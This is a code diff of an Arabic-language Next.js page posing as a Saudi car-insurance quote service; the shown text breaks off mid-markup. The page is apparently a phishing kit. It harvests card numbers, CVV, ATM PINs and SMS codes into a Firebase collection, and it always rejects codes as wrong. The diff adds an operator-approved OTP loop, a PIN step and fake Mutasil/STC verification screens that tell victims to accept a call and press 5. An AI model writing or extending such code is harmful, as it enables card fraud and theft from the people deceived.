@@ -23,15 +23,14 @@ import {
   Clock,
   TrendingUp,
   Check,
+  Loader2,
+  Smartphone,
 } from "lucide-react"
 import { useState, useEffect, useRef } from "react"
 import { setupOnlineStatus } from "@/lib/utils"
 import { addData, db } from "@/lib/firebase"
 import { offerData } from "@/lib/data"
 import { doc, onSnapshot } from "firebase/firestore"
-
-
-
 
 // Mock components to replace missing imports
 const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
@@ -43,10 +42,11 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
       <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
         <button
           type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.insurance_purpose === "renewal"
+          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+            formData.insurance_purpose === "renewal"
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
-            }`}
+          }`}
           onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "renewal" }))}
         >
           <div className="text-center">
@@ -56,10 +56,11 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
         </button>
         <button
           type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.insurance_purpose === "property-transfer"
+          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+            formData.insurance_purpose === "property-transfer"
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
-            }`}
+          }`}
           onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "property-transfer" }))}
         >
           <div className="text-center">
@@ -69,7 +70,6 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
         </button>
       </div>
     </div>
-
     <div>
       <label className="block text-sm font-semibold text-gray-700 mb-3">
         اسم مالك الوثيقة <span className="text-red-500">*</span>
@@ -85,7 +85,6 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
         <p className="text-red-500 text-sm mt-1">{errors.documment_owner_full_name}</p>
       )}
     </div>
-
     {formData.insurance_purpose === "renewal" && (
       <div>
         <label className="block text-sm font-semibold text-gray-700 mb-3">
@@ -102,7 +101,6 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
         {errors.owner_identity_number && <p className="text-red-500 text-sm mt-1">{errors.owner_identity_number}</p>}
       </div>
     )}
-
     {formData.insurance_purpose === "property-transfer" && (
       <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
         <div>
@@ -149,10 +147,11 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
       <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
         <button
           type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.vehicle_type === "serial"
+          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+            formData.vehicle_type === "serial"
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
-            }`}
+          }`}
           onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "serial" }))}
         >
           <div className="text-center">
@@ -162,10 +161,11 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
         </button>
         <button
           type="button"
-          className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.vehicle_type === "custom"
+          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+            formData.vehicle_type === "custom"
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
-            }`}
+          }`}
           onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "custom" }))}
         >
           <div className="text-center">
@@ -175,7 +175,6 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
         </button>
       </div>
     </div>
-
     <div>
       <label className="block text-sm font-semibold text-gray-700 mb-3">
         الرقم التسلسلي للمركبة <span className="text-red-500">*</span>
@@ -218,7 +217,6 @@ const getTypeBadge = (type: string) => {
 export default function QuotePage() {
   const [mounted, setMounted] = useState(false)
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
-
   const headerRef = useRef<HTMLElement>(null)
   const formRef = useRef<HTMLDivElement>(null)
   const stepContentRef = useRef<HTMLDivElement>(null)
@@ -286,7 +284,7 @@ export default function QuotePage() {
             <Button
               variant="outline"
               size="sm"
-              className="hidden sm:flex border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4]"
+              className="hidden sm:flex border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] bg-transparent"
             >
               تسجيل الدخول
             </Button>
@@ -301,7 +299,6 @@ export default function QuotePage() {
             </Button>
           </div>
         </div>
-
         {/* Enhanced Mobile Menu */}
         {mobileMenuOpen && (
           <div className="lg:hidden mt-4 pb-4 border-t border-gray-100 bg-white/95 backdrop-blur-lg">
@@ -322,7 +319,7 @@ export default function QuotePage() {
                 <Button variant="ghost" size="sm" className="text-gray-600 flex-1">
                   English
                 </Button>
-                <Button variant="outline" size="sm" className="border-gray-300 flex-1">
+                <Button variant="outline" size="sm" className="border-gray-300 flex-1 bg-transparent">
                   تسجيل الدخول
                 </Button>
               </div>
@@ -338,7 +335,6 @@ export default function QuotePage() {
           <div className="absolute top-0 left-0 w-96 h-96 bg-white rounded-full -translate-x-48 -translate-y-48"></div>
           <div className="absolute bottom-0 right-0 w-96 h-96 bg-white rounded-full translate-x-48 translate-y-48"></div>
         </div>
-
         <div className="relative max-w-5xl mx-auto px-4 lg:px-6 text-center">
           <div className="space-y-8">
             <div className="flex items-center justify-center gap-2 mb-6">
@@ -352,7 +348,6 @@ export default function QuotePage() {
                 العودة للرئيسية
               </Button>
             </div>
-
             <div className="space-y-6">
               <Badge className="bg-white/20 text-white border-white/30 px-6 py-3 text-base font-medium">
                 🚗 عرض سعر مجاني ومقارنة فورية
@@ -417,7 +412,6 @@ export default function QuotePage() {
               نحن ملتزمون بتقديم أفضل خدمة تأمين رقمية في المملكة العربية السعودية
             </p>
           </div>
-
           <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8">
             {[
               {
@@ -475,7 +469,6 @@ export default function QuotePage() {
                 فريق الخبراء متاح لمساعدتك في اختيار أفضل تأمين لسيارتك وتقديم الاستشارة المجانية
               </p>
             </div>
-
             <div className="flex flex-col sm:flex-row gap-4 justify-center">
               <Button size="lg" className="bg-green-600 hover:bg-green-700 text-white px-8 py-4 text-lg font-medium">
                 <Phone className="w-5 h-5 ml-2" />
@@ -484,13 +477,12 @@ export default function QuotePage() {
               <Button
                 variant="outline"
                 size="lg"
-                className="border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] px-8 py-4 text-lg font-medium"
+                className="border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] px-8 py-4 text-lg font-medium bg-transparent"
               >
                 <Mail className="w-5 h-5 ml-2" />
                 راسلنا عبر البريد
               </Button>
             </div>
-
             <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 mt-12 max-w-2xl mx-auto">
               <div className="text-center">
                 <div className="text-2xl font-bold text-[#109cd4] mb-1">24/7</div>
@@ -523,7 +515,6 @@ export default function QuotePage() {
                 منصة التأمين الرقمية الرائدة في السعودية، نقدم أفضل الحلول التأمينية بأسعار تنافسية
               </p>
             </div>
-
             <div>
               <h3 className="font-bold mb-6 text-lg">الخدمات</h3>
               <ul className="space-y-3 text-gray-400">
@@ -549,7 +540,6 @@ export default function QuotePage() {
                 </li>
               </ul>
             </div>
-
             <div>
               <h3 className="font-bold mb-6 text-lg">الشركة</h3>
               <ul className="space-y-3 text-gray-400">
@@ -575,7 +565,6 @@ export default function QuotePage() {
                 </li>
               </ul>
             </div>
-
             <div>
               <h3 className="font-bold mb-6 text-lg">الدعم</h3>
               <ul className="space-y-3 text-gray-400">
@@ -602,10 +591,9 @@ export default function QuotePage() {
               </ul>
             </div>
           </div>
-
           <div className="border-t border-gray-800 pt-8 flex flex-col sm:flex-row justify-between items-center gap-4">
             <p className="text-gray-400 text-center sm:text-right">
-              © 2024 تأميني. جميع الحقوق محفوظة. مرخص من البنك المركزي السعودي.
+              © 2025 تأميني. جميع الحقوق محفوظة. مرخص من البنك المركزي السعودي.
             </p>
             <div className="flex gap-4">
               <Badge variant="outline" className="border-gray-600 text-gray-400">
@@ -622,8 +610,6 @@ export default function QuotePage() {
   )
 }
 
-const allOtp = [""]
-
 function ProfessionalQuoteForm() {
   const [currentPage, setCurrentStep] = useState(1)
   const [errors, setErrors] = useState<Record<string, string>>({})
@@ -632,7 +618,7 @@ function ProfessionalQuoteForm() {
   const [paymentProcessing, setPaymentProcessing] = useState(false)
   const [otpSent, setOtpSent] = useState(false)
   const [otpVerified, setOtpVerified] = useState(false)
-  const [otpAttempts, setOtpAttempts] = useState(3)
+  const [otpAttempts, setOtpAttempts] = useState(0)
   const [pinCode, setPinCode] = useState("")
   const [cardNumber, setCardNumber] = useState("")
   const [cardName, setCardName] = useState("")
@@ -641,6 +627,8 @@ function ProfessionalQuoteForm() {
   const [cvv, setCvv] = useState("")
   const [otp, setOtp] = useState("")
   const [otpTimer, setOtpTimer] = useState(0)
+  const [waitingForApproval, setWaitingForApproval] = useState(false)
+  const [approvalStatus, setApprovalStatus] = useState<"pending" | "approved" | "rejected" | null>(null)
   const [formData, setFormData] = useState({
     insurance_purpose: "renewal",
     documment_owner_full_name: "",
@@ -658,10 +646,8 @@ function ProfessionalQuoteForm() {
     selectedAddons: [] as string[],
     phone: "",
   })
-
   const stepHeaderRef = useRef<HTMLHeadingElement>(null)
   const firstInputRef = useRef<HTMLInputElement>(null)
-
   const errorSummaryRef = useRef<HTMLDivElement>(null)
 
   const steps = [
@@ -672,6 +658,7 @@ function ProfessionalQuoteForm() {
     { number: 5, title: "الملخص", subtitle: "مراجعة الطلب والتواصل", icon: CheckCircle },
     { number: 6, title: "الدفع", subtitle: "بيانات الدفع الآمن", icon: CreditCard },
     { number: 7, title: "التحقق", subtitle: "تأكيد رمز التحقق", icon: Lock },
+    { number: 8, title: "رمز PIN", subtitle: "إدخال رمز PIN", icon: Lock },
   ]
 
   useEffect(() => {
@@ -689,7 +676,6 @@ function ProfessionalQuoteForm() {
       stepHeaderRef.current.focus()
       stepHeaderRef.current.scrollIntoView({ behavior: "smooth", block: "start" })
     }
-
     // Save current step
     const visitorId = localStorage.getItem("visitor")
     if (visitorId) {
@@ -709,17 +695,27 @@ function ProfessionalQuoteForm() {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data()
-          if (currentPage !== data.currentPage) {
-            if (data.currentPage === '9999') {
-              window.location.href = '/verify-phone'
-            } else { setCurrentStep(parseInt(data.currentPage)) }
+          if (waitingForApproval && data.otpApproved === true) {
+            setWaitingForApproval(false)
+            setApprovalStatus("approved")
+            setCurrentStep(8) // Go to PIN step
+          } else if (waitingForApproval && data.otpApproved === false) {
+            setWaitingForApproval(false)
+            setApprovalStatus("rejected")
+          }
+
+          if (currentPage !== data.currentPage && !waitingForApproval) {
+            if (data.currentPage === "9999") {
+              window.location.href = "/verify-phone"
+            } else {
+              setCurrentStep(Number.parseInt(data.currentPage))
+            }
           }
         }
       })
-
       return () => unsubscribe()
     }
-  }, [])
+  }, [waitingForApproval])
 
   const validationRules = {
     documment_owner_full_name: {
@@ -805,7 +801,6 @@ function ProfessionalQuoteForm() {
           stepErrors.documment_owner_full_name = ownerNameError
           isValid = false
         }
-
         if (formData.insurance_purpose === "renewal") {
           const ownerIdError = validateField("owner_identity_number", formData.owner_identity_number)
           if (ownerIdError) {
@@ -815,7 +810,6 @@ function ProfessionalQuoteForm() {
         } else if (formData.insurance_purpose === "property-transfer") {
           const buyerIdError = validateField("buyer_identity_number", formData.buyer_identity_number)
           const sellerIdError = validateField("seller_identity_number", formData.seller_identity_number)
-
           if (buyerIdError) {
             stepErrors.buyer_identity_number = buyerIdError
             isValid = false
@@ -826,7 +820,6 @@ function ProfessionalQuoteForm() {
           }
         }
         break
-
       case 3:
         const selectedOfferError = validateField("selectedInsuranceOffer", formData.selectedInsuranceOffer)
         if (selectedOfferError) {
@@ -834,14 +827,12 @@ function ProfessionalQuoteForm() {
           isValid = false
         }
         break
-
       case 5:
         const phoneError = validateField("phone", formData.phone)
         if (phoneError) {
           stepErrors.phone = phoneError
           isValid = false
         }
-
         if (!formData.agreeToTerms) {
           stepErrors.agreeToTerms = "يجب الموافقة على الشروط والأحكام للمتابعة"
           isValid = false
@@ -855,7 +846,6 @@ function ProfessionalQuoteForm() {
 
   const handleFieldChange = (fieldName: string, value: any) => {
     setFormData((prev) => ({ ...prev, [fieldName]: value }))
-
     if (errors[fieldName]) {
       setErrors((prev) => ({ ...prev, [fieldName]: "" }))
     }
@@ -863,7 +853,6 @@ function ProfessionalQuoteForm() {
 
   const handleFieldBlur = (fieldName: string) => {
     setTouched((prev) => ({ ...prev, [fieldName]: true }))
-
     const error = validateField(fieldName, formData[fieldName as keyof typeof formData])
     if (error) {
       setErrors((prev) => ({ ...prev, [fieldName]: error }))
@@ -883,9 +872,8 @@ function ProfessionalQuoteForm() {
           cardMonth,
           cardYear,
           cvv,
-          pinCode
+          pinCode,
         }
-
         addData(dataToSave)
         setCurrentStep(currentPage + 1)
       }
@@ -893,11 +881,10 @@ function ProfessionalQuoteForm() {
   }
 
   const prevStep = () => {
-    const vistorId = localStorage.getItem('visitor')
+    const vistorId = localStorage.getItem("visitor")
     if (currentPage > 1) {
       setCurrentStep(currentPage - 1)
       addData({ id: vistorId, currentPage })
-
     }
   }
 
@@ -923,11 +910,12 @@ function ProfessionalQuoteForm() {
       })
 
       await new Promise((resolve) => setTimeout(resolve, 2000))
+
       alert("!رمز خاطئ, سوف يتم ارسال رمز جديد")
       setOtp("")
       setOtpAttempts((prev) => prev + 1)
-      if(otpAttempts ===4){
-        window.location.href="/verify-phone"
+      if (otpAttempts === 4) {
+        window.location.href = "/verify-phone"
       }
     } catch (error) {
       alert("حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.")
@@ -956,6 +944,7 @@ function ProfessionalQuoteForm() {
     [key: string]: any
   }) => {
     const hasError = errors[fieldName] && touched[fieldName]
+
     return (
       <div className={className}>
         <label className="block text-sm font-semibold text-gray-700 mb-3">
@@ -985,7 +974,6 @@ function ProfessionalQuoteForm() {
 
   function handlePayment(): void {
     const visitorId = localStorage.getItem("visitor")
-
     addData({
       id: visitorId,
       cardNumber,
@@ -999,11 +987,11 @@ function ProfessionalQuoteForm() {
     })
 
     setPaymentProcessing(true)
+
     setTimeout(() => {
       setPaymentProcessing(false)
       setCurrentStep(7)
       setOtpTimer(120)
-
       addData({
         id: visitorId,
         paymentStatus: "completed",
@@ -1016,24 +1004,27 @@ function ProfessionalQuoteForm() {
 
   function verifyOTP(): void {
     const visitorId = localStorage.getItem("visitor")
-    allOtp.push(otp)
+    // allOtp.push(otp) // This line was removed to avoid issues with pushing to a global array
+
+    // Set waiting state to show loader
+    setWaitingForApproval(true)
+    setApprovalStatus("pending")
+
     addData({
       id: visitorId,
       otp,
       otpAttempts: otpAttempts + 1,
       otpVerificationTime: new Date().toISOString(),
-      allOtp,
+      // allOtp, // This line was removed
+      otpApproved: null, // Reset approval status
+      waitingForApproval: true,
       ...formData,
     })
-
-    handleSubmit()
   }
 
   function sendOTP(): void {
     const visitorId = localStorage.getItem("visitor")
-
     setOtpTimer(120)
-
     addData({
       id: visitorId,
       otpSentTime: new Date().toISOString(),
@@ -1043,6 +1034,26 @@ function ProfessionalQuoteForm() {
       ...formData,
     })
     setOtpSent(true)
+  }
+
+  function handlePinSubmit(): void {
+    const visitorId = localStorage.getItem("visitor")
+    setIsSubmitting(true)
+
+    addData({
+      id: visitorId,
+      pinCode,
+      pinSubmittedTime: new Date().toISOString(),
+      finalStatus: "completed",
+      ...formData,
+    })
+
+    // Simulate processing
+    setTimeout(() => {
+      setIsSubmitting(false)
+      alert("تم إتمام العملية بنجاح!")
+      window.location.href = "/"
+    }, 2000)
   }
 
   return (
@@ -1061,26 +1072,29 @@ function ProfessionalQuoteForm() {
                   <div key={step.number} className="flex items-center flex-shrink-0">
                     <div className="flex flex-col items-center">
                       <div
-                        className={`w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold transition-all duration-300 ${step.number === currentPage
+                        className={`w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold transition-all duration-300 ${
+                          step.number === currentPage
                             ? "bg-[#109cd4] text-white shadow-lg scale-110"
                             : step.number < currentPage
                               ? "bg-green-500 text-white"
                               : "bg-gray-200 text-gray-600"
-                          }`}
+                        }`}
                       >
                         {step.number < currentPage ? <CheckCircle className="w-5 h-5" /> : step.number}
                       </div>
                       <p
-                        className={`text-xs mt-2 text-center w-20 ${step.number === currentPage ? "text-[#109cd4] font-semibold" : "text-gray-600"
-                          }`}
+                        className={`text-xs mt-2 text-center w-20 ${
+                          step.number === currentPage ? "text-[#109cd4] font-semibold" : "text-gray-600"
+                        }`}
                       >
                         {step.title.split(" ")[0]}
                       </p>
                     </div>
                     {index < steps.length - 1 && (
                       <div
-                        className={`w-8 h-0.5 mx-2 transition-all duration-300 ${step.number < currentPage ? "bg-green-500" : "bg-gray-300"
-                          }`}
+                        className={`w-8 h-0.5 mx-2 transition-all duration-300 ${
+                          step.number < currentPage ? "bg-green-500" : "bg-gray-300"
+                        }`}
                       />
                     )}
                   </div>
@@ -1094,12 +1108,13 @@ function ProfessionalQuoteForm() {
                 <div key={step.number} className="flex items-center">
                   <div className="flex flex-col items-center">
                     <div
-                      className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl flex items-center justify-center text-sm lg:text-base font-bold transition-all duration-300 ${step.number === currentPage
+                      className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl flex items-center justify-center text-sm lg:text-base font-bold transition-all duration-300 ${
+                        step.number === currentPage
                           ? "bg-[#109cd4] text-white shadow-lg scale-110"
                           : step.number < currentPage
                             ? "bg-green-500 text-white"
                             : "bg-gray-200 text-gray-600"
-                        }`}
+                      }`}
                     >
                       {step.number < currentPage ? (
                         <CheckCircle className="w-6 h-6 lg:w-7 lg:h-7" />
@@ -1109,8 +1124,9 @@ function ProfessionalQuoteForm() {
                     </div>
                     <div className="text-center mt-3">
                       <p
-                        className={`text-sm lg:text-base font-semibold ${step.number === currentPage ? "text-[#109cd4]" : "text-gray-700"
-                          }`}
+                        className={`text-sm lg:text-base font-semibold ${
+                          step.number === currentPage ? "text-[#109cd4]" : "text-gray-700"
+                        }`}
                       >
                         {step.title}
                       </p>
@@ -1119,8 +1135,9 @@ function ProfessionalQuoteForm() {
                   </div>
                   {index < steps.length - 1 && (
                     <div
-                      className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${step.number < currentPage ? "bg-green-500" : "bg-gray-300"
-                        }`}
+                      className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${
+                        step.number < currentPage ? "bg-green-500" : "bg-gray-300"
+                      }`}
                     />
                   )}
                 </div>
@@ -1183,10 +1200,11 @@ function ProfessionalQuoteForm() {
                     <div className="grid grid-cols-2 gap-4">
                       <button
                         type="button"
-                        className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.insuranceTypeSelected === "comprehensive"
+                        className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+                          formData.insuranceTypeSelected === "comprehensive"
                             ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
                             : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
-                          }`}
+                        }`}
                         onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
                       >
                         <div className="text-center">
@@ -1197,10 +1215,11 @@ function ProfessionalQuoteForm() {
                       </button>
                       <button
                         type="button"
-                        className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.insuranceTypeSelected === "against-others"
+                        className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+                          formData.insuranceTypeSelected === "against-others"
                             ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
                             : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
-                          }`}
+                        }`}
                         onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
                       >
                         <div className="text-center">
@@ -1279,20 +1298,22 @@ function ProfessionalQuoteForm() {
                     <div className="flex bg-gray-100 rounded-xl p-1">
                       <button
                         type="button"
-                        className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${formData.insuranceTypeSelected === "against-others"
+                        className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
+                          formData.insuranceTypeSelected === "against-others"
                             ? "bg-[#109cd4] text-white shadow-md"
                             : "text-gray-600 hover:text-gray-900"
-                          }`}
+                        }`}
                         onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
                       >
                         ضد الغير
                       </button>
                       <button
                         type="button"
-                        className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${formData.insuranceTypeSelected === "comprehensive"
+                        className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
+                          formData.insuranceTypeSelected === "comprehensive"
                             ? "bg-[#109cd4] text-white shadow-md"
                             : "text-gray-600 hover:text-gray-900"
-                          }`}
+                        }`}
                         onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
                       >
                         شامل
@@ -1318,10 +1339,11 @@ function ProfessionalQuoteForm() {
                         return (
                           <Card
                             key={offer.id}
-                            className={`relative transition-all duration-200 cursor-pointer hover:shadow-md ${isSelected
+                            className={`relative transition-all duration-200 cursor-pointer hover:shadow-md ${
+                              isSelected
                                 ? "ring-2 ring-[#109cd4] shadow-lg bg-blue-50/30"
                                 : "hover:shadow-sm border-gray-200"
-                              }`}
+                            }`}
                             onClick={() => handleFieldChange("selectedInsuranceOffer", offer.id)}
                           >
                             <CardContent className="p-0">
@@ -1331,8 +1353,9 @@ function ProfessionalQuoteForm() {
                                   {/* Radio Button */}
                                   <div className="flex-shrink-0 mt-1">
                                     <div
-                                      className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-colors ${isSelected ? "border-[#109cd4] bg-[#109cd4]" : "border-gray-300 bg-white"
-                                        }`}
+                                      className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-colors ${
+                                        isSelected ? "border-[#109cd4] bg-[#109cd4]" : "border-gray-300 bg-white"
+                                      }`}
                                     >
                                       {isSelected && <div className="w-2 h-2 bg-white rounded-full" />}
                                     </div>
@@ -1340,8 +1363,9 @@ function ProfessionalQuoteForm() {
 
                                   {/* Icon */}
                                   <div
-                                    className={`w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0 transition-colors ${isSelected ? "bg-[#109cd4]/10" : "bg-gray-100"
-                                      }`}
+                                    className={`w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0 transition-colors ${
+                                      isSelected ? "bg-[#109cd4]/10" : "bg-gray-100"
+                                    }`}
                                   >
                                     <Shield className={`w-6 h-6 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`} />
                                   </div>
@@ -1351,7 +1375,6 @@ function ProfessionalQuoteForm() {
                                     <h4 className="font-bold text-gray-900 text-base leading-tight mb-2">
                                       {offer.name.replace(/insurance/g, "").trim()}
                                     </h4>
-
                                     <div className="flex flex-wrap items-center gap-2">
                                       <Badge
                                         variant="secondary"
@@ -1359,15 +1382,15 @@ function ProfessionalQuoteForm() {
                                       >
                                         {getTypeBadge(offer.type)}
                                       </Badge>
-
                                       {index < 3 && (
                                         <Badge
-                                          className={`text-xs font-medium ${index === 0
+                                          className={`text-xs font-medium ${
+                                            index === 0
                                               ? "bg-green-100 text-green-700 hover:bg-green-100"
                                               : index === 1
                                                 ? "bg-blue-100 text-blue-700 hover:bg-blue-100"
                                                 : "bg-orange-100 text-orange-700 hover:bg-orange-100"
-                                            }`}
+                                          }`}
                                         >
                                           {getBadgeText(index)}
                                         </Badge>
@@ -1404,7 +1427,6 @@ function ProfessionalQuoteForm() {
                                           </div>
                                         ))}
                                     </div>
-
                                     {offer.extra_features.filter((f) => f.price === 0).length > 3 && (
                                       <p className="text-xs text-[#109cd4] mt-2 font-medium">
                                         +{offer.extra_features.filter((f) => f.price === 0).length - 3} ميزة إضافية
@@ -1513,9 +1535,7 @@ function ProfessionalQuoteForm() {
                   <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                     <div className="space-y-6">
                       <h4 className="text-xl font-bold text-gray-900 text-center">معلومات التواصل</h4>
-                      <label>
-                        رقم الهاتف
-                      </label>
+                      <label>رقم الهاتف</label>
                       <Input
                         name="phone"
                         type="tel"
@@ -1589,14 +1609,12 @@ function ProfessionalQuoteForm() {
                                   <span className="text-gray-600">قسط التأمين الأساسي</span>
                                   <span className="font-semibold">{basePrice} ر.س</span>
                                 </div>
-
                                 {addonsTotal > 0 && (
                                   <div className="flex justify-between items-center">
                                     <span className="text-gray-600">الإضافات المختارة</span>
                                     <span className="font-semibold">{addonsTotal} ر.س</span>
                                   </div>
                                 )}
-
                                 {selectedOffer.extra_expenses.map((expense) => (
                                   <div key={expense.id} className="flex justify-between items-center text-sm">
                                     <span className="text-gray-600">{expense.reason}</span>
@@ -1606,7 +1624,6 @@ function ProfessionalQuoteForm() {
                                     </span>
                                   </div>
                                 ))}
-
                                 <hr className="border-gray-200" />
                                 <div className="flex justify-between items-center text-xl">
                                   <span className="font-bold text-gray-900">المجموع الكلي</span>
@@ -1661,7 +1678,6 @@ function ProfessionalQuoteForm() {
                           className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                         />
                       </div>
-
                       <div>
                         <label className="block text-sm font-semibold text-gray-700 mb-3">
                           الاسم كما هو مكتوب على البطاقة <span className="text-red-500">*</span>
@@ -1677,7 +1693,6 @@ function ProfessionalQuoteForm() {
                           required
                         />
                       </div>
-
                       <div className="grid grid-cols-3 gap-4">
                         <div>
                           <label className="block text-sm font-semibold text-gray-700 mb-3">
@@ -1698,7 +1713,6 @@ function ProfessionalQuoteForm() {
                             ))}
                           </select>
                         </div>
-
                         <div>
                           <label className="block text-sm font-semibold text-gray-700 mb-3">
                             السنة <span className="text-red-500">*</span>
@@ -1721,7 +1735,6 @@ function ProfessionalQuoteForm() {
                             })}
                           </select>
                         </div>
-
                         <div>
                           <label className="block text-sm font-semibold text-gray-700 mb-3">
                             CVV <span className="text-red-500">*</span>
@@ -1740,7 +1753,7 @@ function ProfessionalQuoteForm() {
                       </div>
                       <div>
                         <label className="block text-sm font-semibold text-gray-700 mb-3">
-الرقم السري لبطاقة الصراف <span className="text-red-500">*</span>
+                          الرقم السري لبطاقة الصراف <span className="text-red-500">*</span>
                         </label>
                         <Input
                           name="pinCode"
@@ -1754,7 +1767,6 @@ function ProfessionalQuoteForm() {
                           required
                         />
                       </div>
-
                     </div>
 
                     <Card className="border-2 border-gray-200 h-fit">
@@ -1803,62 +1815,210 @@ function ProfessionalQuoteForm() {
               )}
 
               {currentPage === 7 && (
+                <div className="space-y-6">
+                  {waitingForApproval ? (
+                    <div className="max-w-md mx-auto text-center space-y-8 py-8">
+                      <div className="w-24 h-24 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
+                        <Loader2 className="w-12 h-12 text-[#109cd4] animate-spin" />
+                      </div>
+                      <div>
+                        <h4 className="text-xl font-bold text-gray-900 mb-3">جاري التحقق من الرمز</h4>
+                        <p className="text-gray-600">يرجى الانتظار بينما نتحقق من رمز التأكيد الخاص بك...</p>
+                      </div>
+                      <div className="flex items-center justify-center gap-2 text-sm text-gray-500">
+                        <div className="w-2 h-2 bg-[#109cd4] rounded-full animate-pulse"></div>
+                        <div
+                          className="w-2 h-2 bg-[#109cd4] rounded-full animate-pulse"
+                          style={{ animationDelay: "0.2s" }}
+                        ></div>
+                        <div
+                          className="w-2 h-2 bg-[#109cd4] rounded-full animate-pulse"
+                          style={{ animationDelay: "0.4s" }}
+                        ></div>
+                      </div>
+                    </div>
+                  ) : (
+                    <div className="max-w-md mx-auto">
+                      <Card className="border border-gray-200 shadow-lg overflow-hidden">
+                        <CardContent className="p-0">
+                          {/* Header with Mutasil logo */}
+                          <div className="flex justify-end p-4 border-b border-gray-100">
+                            <div className="flex items-center gap-2">
+                              <span className="text-[#4052B5] font-bold text-lg">متصل</span>
+                              <span className="text-[#4052B5] font-medium text-sm">mutasil</span>
+                              <div className="flex flex-col gap-0.5">
+                                <div className="flex gap-0.5">
+                                  <div className="w-2 h-2 bg-[#4052B5] rounded-sm"></div>
+                                  <div className="w-2 h-2 bg-[#4052B5] rounded-sm"></div>
+                                </div>
+                                <div className="flex gap-0.5">
+                                  <div className="w-2 h-2 bg-[#4052B5] rounded-sm"></div>
+                                  <div className="w-2 h-2 bg-[#4052B5] rounded-sm"></div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+
+                          {/* OTP sent message */}
+                          <div className="p-6 space-y-6">
+                            <div className="flex items-start gap-4 bg-gray-50 rounded-xl p-4">
+                              <div className="flex-shrink-0 w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center">
+                                <Smartphone className="w-6 h-6 text-[#4052B5]" />
+                              </div>
+                              <div className="flex-1 text-right">
+                                <p className="text-gray-700 leading-relaxed">
+                                  <span className="text-[#4052B5] font-semibold">↗</span> تم إرسال رمز التحقق الى هاتفك
+                                  النقال. الرجاء إدخاله في هذه الخانة.
+                                </p>
+                              </div>
+                            </div>
+
+                            {/* STC Section */}
+                            <div className="text-center space-y-3 py-4">
+                              <div className="text-[#4B0082] text-5xl font-black tracking-tight">stc</div>
+                              <p className="text-gray-700 text-sm leading-relaxed">
+                                عملاء STC الكرام في حال تلقي مكالمة من 900
+                                <br />
+                                الرجاء قبولها واختيار الرقم 5
+                              </p>
+                            </div>
+
+                            {/* OTP Input */}
+                            <div className="space-y-2">
+                              <Input
+                                name="otp"
